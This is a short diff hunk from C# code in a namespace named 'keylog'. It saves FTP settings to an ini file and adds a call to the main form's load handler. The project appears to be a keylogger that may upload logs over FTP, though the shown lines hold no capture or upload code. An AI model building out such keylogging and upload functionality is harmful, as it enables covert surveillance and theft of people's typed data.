@@ -127,7 +127,7 @@ namespace keylog
             using (StreamWriter file = new StreamWriter("ftp_conf.ini"))
                 foreach (var entry in d)
                     file.WriteLine("{0},{1}", entry.Key, entry.Value);
-
+            mainForm.Instince.mainForm_Load(sender, e);
         }
 
         private void FTP_Load(object sender, EventArgs e)
